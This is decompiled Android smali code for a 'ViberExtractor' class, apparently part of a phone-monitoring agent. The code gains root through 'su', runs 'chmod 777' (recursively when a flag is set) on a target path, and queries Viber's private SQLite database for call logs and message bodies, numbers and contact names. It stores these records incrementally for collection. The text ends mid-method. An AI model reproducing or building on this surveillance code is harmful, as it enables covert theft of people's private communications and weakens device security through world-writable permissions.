.class public Lcom/hp/vd/module/custom/viber/ViberExtractor;
.super Ljava/lang/Object;
.source "ViberExtractor.java"

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field protected static final TAG:Ljava/lang/String; = "ViberExtractor"

.field protected static final TEMP_FILE_NAME_CALL_PREFIX:Ljava/lang/String; = "ViberCallTmpFile"

.field protected static final TEMP_FILE_NAME_MESSAGE_PREFIX:Ljava/lang/String; = "ViberMessageTmpFile"


# instance fields
.field protected context:Lcom/hp/vd/context/Context;

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;

.field protected viberCallDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ViberCallData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected viberMessageDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ViberMessageData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field


# direct methods
.method public constructor <init>(Lcom/hp/vd/context/Context;Lcom/j256/ormlite/dao/Dao;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lcom/hp/vd/context/Context;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ViberCallData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ViberMessageData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/data/ModuleData;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    .line 52
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 39
    iput-object v0, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->context:Lcom/hp/vd/context/Context;

    .line 40
    iput-object v0, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 41
    iput-object v0, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 43
    iput-object v0, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->viberCallDao:Lcom/j256/ormlite/dao/Dao;

    .line 44
    iput-object v0, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->viberMessageDao:Lcom/j256/ormlite/dao/Dao;

    .line 53
    iput-object p1, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->context:Lcom/hp/vd/context/Context;

    .line 54
    iput-object p2, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->viberCallDao:Lcom/j256/ormlite/dao/Dao;

    .line 55
    iput-object p3, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->viberMessageDao:Lcom/j256/ormlite/dao/Dao;

    .line 56
    iput-object p4, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 57
    iput-object p5, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method protected chmod(Ljava/lang/String;Z)Z
    .locals 5

    .line 420
    iget-object v0, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    .line 423
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v1

    const-string v2, "su"

    invoke-virtual {v1, v2}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v1

    .line 424
    new-instance v2, Ljava/io/DataOutputStream;

    invoke-virtual {v1}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    const/4 v3, 0x1

    if-ne p2, v3, :cond_0

    .line 427
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "chmod -R 777 "

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "\n"

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    goto :goto_0

    .line 430
    :cond_0
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "chmod 777 "

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "\n"

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 433
    :goto_0
    invoke-virtual {v2}, Ljava/io/DataOutputStream;->flush()V

    const-string p1, "exit\n"

    .line 435
    invoke-virtual {v2, p1}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 436
    invoke-virtual {v2}, Ljava/io/DataOutputStream;->flush()V

    .line 438
    invoke-virtual {v1}, Ljava/lang/Process;->waitFor()I
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    return v3

    :catch_0
    move-exception p1

    const-string p2, "ViberExtractor"

    const-string v1, "chmod(): InterruptedException"

    .line 446
    invoke-interface {v0, p2, v1, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    goto :goto_1

    :catch_1
    move-exception p1

    const-string p2, "ViberExtractor"

    const-string v1, "chmod(): IOException"

    .line 443
    invoke-interface {v0, p2, v1, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :goto_1
    const/4 p1, 0x0

    return p1
.end method

.method protected cleanTempFilesFromPreviousInvocations(Ljava/lang/String;)V
    .locals 3

    .line 455
    :try_start_0
    new-instance v0, Ljava/io/File;

    iget-object v1, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 456
    new-instance v1, Lcom/hp/vd/module/custom/viber/StartsWithFilenameFilter;

    invoke-direct {v1, p1}, Lcom/hp/vd/module/custom/viber/StartsWithFilenameFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Ljava/io/File;->listFiles(Ljava/io/FilenameFilter;)[Ljava/io/File;

    move-result-object p1

    .line 458
    array-length v0, p1

    const/4 v1, 0x0

    :goto_0
    if-ge v1, v0, :cond_0

    aget-object v2, p1, v1

    .line 459
    invoke-virtual {v2}, Ljava/io/File;->delete()Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :catch_0
    move-exception p1

    .line 463
    iget-object v0, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "ViberExtractor"

    const-string v2, "Throwable caught while deleting temp files from previous invocation at"

    invoke-interface {v0, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :cond_0
    return-void
.end method

.method public copy(Ljava/io/File;Ljava/io/File;)V
    .locals 7
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .line 389
    new-instance v0, Ljava/io/FileInputStream;

    invoke-direct {v0, p1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    .line 390
    new-instance p1, Ljava/io/FileOutputStream;

    invoke-direct {p1, p2}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 392
    invoke-virtual {v0}, Ljava/io/FileInputStream;->getChannel()Ljava/nio/channels/FileChannel;

    move-result-object v1

    .line 393
    invoke-virtual {p1}, Ljava/io/FileOutputStream;->getChannel()Ljava/nio/channels/FileChannel;

    move-result-object v6

    .line 395
    invoke-virtual {v1}, Ljava/nio/channels/FileChannel;->size()J

    move-result-wide v4

    const-wide/16 v2, 0x0

    invoke-virtual/range {v1 .. v6}, Ljava/nio/channels/FileChannel;->transferTo(JJLjava/nio/channels/WritableByteChannel;)J

    .line 397
    invoke-virtual {v0}, Ljava/io/FileInputStream;->close()V

    .line 398
    invoke-virtual {p1}, Ljava/io/FileOutputStream;->close()V

    return-void
.end method

.method protected detectViberVersion()Ljava/lang/Integer;
    .locals 3

    .line 308
    :try_start_0
    iget-object v0, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    const-string v1, "com.viber.voip"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;

    move-result-object v0

    .line 309
    iget v0, v0, Landroid/content/pm/PackageInfo;->versionCode:I

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object v0

    :catch_0
    move-exception v0

    .line 312
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    const/4 v0, 0x0

    return-object v0
.end method

.method protected extractCalls(Landroid/database/sqlite/SQLiteDatabase;)V
    .locals 12

    .line 211
    iget-object v0, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v1, "viber_max_call_id"

    invoke-virtual {v0, v1}, Lcom/hp/vd/data/ModuleData;->customGetInt(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    .line 215
    :try_start_0
    new-instance v1, Lcom/hp/vd/module/custom/viber/CallColumns;

    invoke-direct {v1}, Lcom/hp/vd/module/custom/viber/CallColumns;-><init>()V

    const-string v3, "calls"

    const/4 v2, 0x5

    .line 217
    new-array v4, v2, [Ljava/lang/String;

    const/4 v2, 0x0

    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v5, "_id"

    aput-object v5, v4, v2

    const/4 v2, 0x1

    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v5, "type"

    aput-object v5, v4, v2

    const/4 v2, 0x2

    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v5, "number"

    aput-object v5, v4, v2

    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v2, "duration"

    const/4 v11, 0x3

    aput-object v2, v4, v11

    const/4 v2, 0x4

    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v5, "date"

    aput-object v5, v4, v2

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v5, "_id"

    invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, " > "

    invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    const/4 v6, 0x0

    const/4 v7, 0x0

    const/4 v8, 0x0

    const/4 v9, 0x0

    const-string v10, "400"

    move-object v2, p1

    invoke-virtual/range {v2 .. v10}, Landroid/database/sqlite/SQLiteDatabase;->query(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object p1

    if-nez p1, :cond_0

    .line 235
    iget-object p1, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "ViberExtractor"

    const-string v2, "Call Cursor is null."

    invoke-interface {p1, v1, v2, v11}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-void

    :cond_0
    if-eqz p1, :cond_1

    move v2, v0

    .line 241
    :goto_0
    invoke-interface {p1}, Landroid/database/Cursor;->moveToNext()Z

    move-result v3

    if-eqz v3, :cond_2

    .line 242
    new-instance v2, Lcom/hp/vd/data/ViberCallData;

    invoke-direct {v2}, Lcom/hp/vd/data/ViberCallData;-><init>()V

    .line 244
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "_id"

    invoke-interface {p1, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {p1, v3}, Landroid/database/Cursor;->getInt(I)I

    move-result v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    iput-object v3, v2, Lcom/hp/vd/data/ViberCallData;->internalId:Ljava/lang/Integer;

    .line 246
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "type"

    invoke-interface {p1, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {p1, v3}, Landroid/database/Cursor;->getInt(I)I

    move-result v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    iput-object v3, v2, Lcom/hp/vd/data/ViberCallData;->type:Ljava/lang/Integer;

    .line 247
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "number"

    invoke-interface {p1, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {p1, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    iput-object v3, v2, Lcom/hp/vd/data/ViberCallData;->number:Ljava/lang/String;

    .line 248
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "duration"

    invoke-interface {p1, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {p1, v3}, Landroid/database/Cursor;->getInt(I)I

    move-result v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    iput-object v3, v2, Lcom/hp/vd/data/ViberCallData;->duration:Ljava/lang/Integer;

    .line 250
    new-instance v3, Ljava/sql/Date;

    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v4, "date"

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v4

    invoke-direct {v3, v4, v5}, Ljava/sql/Date;-><init>(J)V

    iput-object v3, v2, Lcom/hp/vd/data/ViberCallData;->createdAt:Ljava/util/Date;

    .line 252
    iget-object v3, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->viberCallDao:Lcom/j256/ormlite/dao/Dao;

    invoke-interface {v3, v2}, Lcom/j256/ormlite/dao/Dao;->create(Ljava/lang/Object;)I

    .line 254
    iget-object v2, v2, Lcom/hp/vd/data/ViberCallData;->internalId:Ljava/lang/Integer;

    invoke-virtual {v2}, Ljava/lang/Integer;->intValue()I

    move-result v2

    goto :goto_0

    :cond_1
    move v2, v0

    .line 258
    :cond_2
    invoke-interface {p1}, Landroid/database/Cursor;->close()V

    .line 264
    iget-object p1, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v1, "viber_max_call_id"

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {p1, v1, v3}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 266
    iget-object p1, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {p1}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object p1

    invoke-virtual {p1}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getModuleDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object p1

    .line 267
    iget-object v1, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-interface {p1, v1}, Lcom/j256/ormlite/dao/Dao;->update(Ljava/lang/Object;)I
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    .line 277
    iget-object p1, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "ViberExtractor"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Viber Calls successfully extracted. "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v0, " to: "

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-interface {p1, v1, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return-void

    :catch_0
    move-exception p1

    .line 270
    iget-object v1, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "ViberExtractor"

    const-string v3, "Error extracting data."

    invoke-interface {v1, v2, v3, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 272
    iget-object p1, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v1, "viber_max_call_id"

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    invoke-virtual {p1, v1, v0}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    return-void
.end method

.method protected extractMessages(Landroid/database/sqlite/SQLiteDatabase;)V
    .locals 4

    const-string v0, "SELECT m._id, m.type, m.body, m.date, pi.number, pi.display_name, pi.contact_name FROM messages m INNER JOIN participants p ON p.conversation_id = m.conversation_id INNER JOIN participants_info AS pi ON pi._id = p.participant_info_id WHERE pi.number != \"owner\"  AND pi.number != \"\" AND m.extra_mime NOT IN (\"call\", \"audio\", \"video\", \"image\", \"sticker\", \"location\") AND m._id > ? GROUP BY m._id ORDER BY m._id ASC LIMIT ?"

    const-string v1, "SELECT m._id, m.send_type as type, m.body, m.msg_date as date, pi.number, pi.display_name, pi.contact_name FROM messages m INNER JOIN participants p ON p.conversation_id = m.conversation_id INNER JOIN participants_info AS pi ON pi._id = p.participant_info_id WHERE pi.number != \"owner\"  AND pi.number != \"\" AND m.extra_mime NOT IN (\"call\", \"audio\", \"video\", \"image\", \"sticker\", \"location\") and m.body NOT IN (\"incoming_call\", \"outgoing_call\") AND m._id > ? GROUP BY m._id ORDER BY m._id ASC LIMIT ?"

    .line 289
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/viber/ViberExtractor;->detectViberVersion()Ljava/lang/Integer;

    move-result-object v2

    if-nez v2, :cond_0

    .line 292
    iget-object p1, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v0, "ViberExtractor"

    const-string v1, ".versionCode cannot be detected. Most probably Viber is not installed (com.viber.voip)"

    invoke-interface {p1, v0, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return-void

    .line 297
    :cond_0
    invoke-virtual {v2}, Ljava/lang/Integer;->intValue()I

    move-result v2

    const v3, 0x35cae

    if-gt v2, v3, :cond_1

    .line 298
    invoke-virtual {p0, p1, v0}, Lcom/hp/vd/module/custom/viber/ViberExtractor;->extractMessagesWithQuery(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)V

    goto :goto_0

    .line 301
    :cond_1
    invoke-virtual {p0, p1, v1}, Lcom/hp/vd/module/custom/viber/ViberExtractor;->extractMessagesWithQuery(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)V

    :goto_0
    return-void
.end method

.method protected extractMessagesWithQuery(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)V
    .locals 6

    const/4 v0, 0x0

    .line 320
    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    .line 327
    iget-object v1, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v2, "viber_max_message_id"

    invoke-virtual {v1, v2}, Lcom/hp/vd/data/ModuleData;->customGetInt(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v1

    .line 328
    invoke-virtual {v1}, Ljava/lang/Integer;->intValue()I

    move-result v2

    .line 331
    :try_start_0
    new-instance v3, Lcom/hp/vd/module/custom/viber/MessageColumns;

    invoke-direct {v3}, Lcom/hp/vd/module/custom/viber/MessageColumns;-><init>()V

    const/4 v4, 0x2

    .line 333
    new-array v4, v4, [Ljava/lang/String;

    .line 336
    invoke-virtual {v1}, Ljava/lang/Integer;->toString()Ljava/lang/String;

    move-result-object v5

    aput-object v5, v4, v0

    const/4 v0, 0x1

    const-string v5, "200"

    aput-object v5, v4, v0

    .line 333
    invoke-virtual {p1, p2, v4}, Landroid/database/sqlite/SQLiteDatabase;->rawQuery(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object p1

    if-nez p1, :cond_0

    .line 342
    iget-object p1, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string p2, "ViberExtractor"

    const-string v0, "Message Cursor is null."

    const/4 v2, 0x3

    invoke-interface {p1, p2, v0, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-void

    :cond_0
    if-eqz p1, :cond_1

    .line 348
    :goto_0
    invoke-interface {p1}, Landroid/database/Cursor;->moveToNext()Z

    move-result p2

    if-eqz p2, :cond_1

    .line 349
    new-instance p2, Lcom/hp/vd/data/ViberMessageData;

    invoke-direct {p2}, Lcom/hp/vd/data/ViberMessageData;-><init>()V

    .line 351
    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v0, "_id"

    invoke-interface {p1, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {p1, v0}, Landroid/database/Cursor;->getInt(I)I

    move-result v0

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    iput-object v0, p2, Lcom/hp/vd/data/ViberMessageData;->internalId:Ljava/lang/Integer;

    .line 352
    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v0, "type"

    invoke-interface {p1, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {p1, v0}, Landroid/database/Cursor;->getInt(I)I

    move-result v0

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    iput-object v0, p2, Lcom/hp/vd/data/ViberMessageData;->type:Ljava/lang/Integer;

    .line 353
    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v0, "body"

    invoke-interface {p1, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {p1, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p2, Lcom/hp/vd/data/ViberMessageData;->body:Ljava/lang/String;

    .line 354
    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v0, "number"

    invoke-interface {p1, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {p1, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p2, Lcom/hp/vd/data/ViberMessageData;->number:Ljava/lang/String;

    .line 355
    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v0, "display_name"

    invoke-interface {p1, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {p1, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p2, Lcom/hp/vd/data/ViberMessageData;->displayName:Ljava/lang/String;

    .line 356
    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v0, "contact_name"

    invoke-interface {p1, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {p1, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p2, Lcom/hp/vd/data/ViberMessageData;->contactName:Ljava/lang/String;

    .line 357
    new-instance v0, Ljava/sql/Date;

    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v2, "date"

    invoke-interface {p1, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {p1, v2}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v4

    invoke-direct {v0, v4, v5}, Ljava/sql/Date;-><init>(J)V

    iput-object v0, p2, Lcom/hp/vd/data/ViberMessageData;->createdAt:Ljava/util/Date;

    .line 359
    iget-object v0, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->viberMessageDao:Lcom/j256/ormlite/dao/Dao;

    invoke-interface {v0, p2}, Lcom/j256/ormlite/dao/Dao;->create(Ljava/lang/Object;)I

    .line 361
    iget-object p2, p2, Lcom/hp/vd/data/ViberMessageData;->internalId:Ljava/lang/Integer;

    invoke-virtual {p2}, Ljava/lang/Integer;->intValue()I

    move-result v2

    goto/16 :goto_0

    .line 365
    :cond_1
    invoke-interface {p1}, Landroid/database/Cursor;->close()V

    .line 371
    iget-object p1, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string p2, "viber_max_message_id"

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    invoke-virtual {p1, p2, v0}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 373
    iget-object p1, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {p1}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object p1

    invoke-virtual {p1}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getModuleDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object p1

    .line 374
